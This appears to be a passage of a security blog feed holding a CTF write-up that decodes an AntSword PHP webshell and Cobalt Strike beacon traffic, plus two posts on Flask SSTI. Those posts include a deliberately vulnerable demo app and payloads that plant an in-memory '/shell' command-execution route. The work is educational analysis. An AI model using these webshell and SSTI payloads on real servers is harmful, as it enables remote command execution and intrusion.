class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>上面是对解压包的url解码，然后gzip+base64解码尝试还原代码内容,对上面的每个参数进行解密!下面这个包是解压缩的包的解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>可以看到，参数s接收执行命令的参数    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>所以s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>可以得到压缩密码为P4Uk6qkh6Gvqwg3y。下面就可以解压beacon keys.下面需要做的工作为：获得私钥，通过私钥获得AES密钥以查看与teamserver的通信内容。需要用到的工具在<br><a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p><p>首先是根据私钥文件恢复RSA KEY。<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">根据RSA KEY 恢复AES KEY，需要看beacon通信的数据包，根据cs特性，一般这个值藏在cookie里。<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">拿到AES KEY之后，继续利用脚本还原beacon返回的内容，这里抓取的是submit.php的特征。根据CobaltStrike的通信规则，beacon会向teamserver POST submit.php?id=xxx，POSTDATA为AES加密后的内容。将加密后的内容复制出来之后解密<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>注意需要是base64格式的，然后使用脚本进行解密<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">解密后得到flag。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题太折磨人了，做了好久才做出来，写wp又写了一段时间。顺便学了下CS的简单通信过程，收获还是有的。<br>参考链接：<a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包&lt;img src=&quot;http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim&quot; alt=&quot;paste image&quot;&gt;在这里看到了很多ignition</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Analysis of flask memory webshell</title>
    <link href="https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/"/>
    <id>https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/</id>
    <published>2021-09-24T13:16:39.000Z</published>
    <updated>2021-09-24T14:56:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage I’ve introduced memory webshell in flask and implemented it,so in this passage I’ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>There are some complex functions and variables in the PoC,I’ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(“__import__(‘os’).popen(‘whoami’).read()”)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure><p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(‘/shell’,’shell’,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didn’t explain variables like request_ctx_stack 、app、current_app.</p><p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop 、handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask app’s every handle function in route to handle the current request!</p><p>request.args.get() is used for get the parameter’s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p><p>In eval function, we noticed that there is a variable called app, but now we don’t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p><p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NOTICE&quot;&gt;&lt;a href=&quot;#NOTICE&quot; class=&quot;headerlink&quot; title=&quot;NOTICE&quot;&gt;&lt;/a&gt;NOTICE&lt;/h1&gt;&lt;p&gt;Before analysis , I assumed that you know the princple</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>implementation of memory webshell in flask</title>
    <link href="https://polosec.github.io/2021/09/05/webshell-in-flask/"/>
    <id>https://polosec.github.io/2021/09/05/webshell-in-flask/</id>
    <published>2021-09-05T09:30:36.000Z</published>
    <updated>2021-09-15T15:08:03.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Server-side Template Injection(SSTI)  is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited .</p><p>It is easy to be exploited if a SSTI vulnerability were found. In this page ,I’ll show how to utilize it to inject webshell into memory.In next passage I’ll explain the procedure of a Flask app receive,understand and execute the command which sent by user.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>A simple Flask framework web application with SSTI vulnerability as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>In this demo , you can enter test directory and pass parameter ‘name’ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains.</p><p>Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631714973234z6zu44pt.png?imageslim" alt="paste image"><br>This PoC shows that  SSTI vulnerability could execute system command in web page  which based on Flask.But the privilege inherited from the user who launched this application.</p><h1 id="Webshell-injection-in-Flask"><a href="#Webshell-injection-in-Flask" class="headerlink" title="Webshell injection in Flask"></a>Webshell injection in Flask</h1><p>There is a way to inject webshell into flask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.find the function which responsible for registering route</span><br><span class="line">2.pass paramaters to the function and improt os modules to execute system command</span><br><span class="line">3.expose an API to  execute user-defined system commandso </span><br><span class="line">so here is the Payload</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda 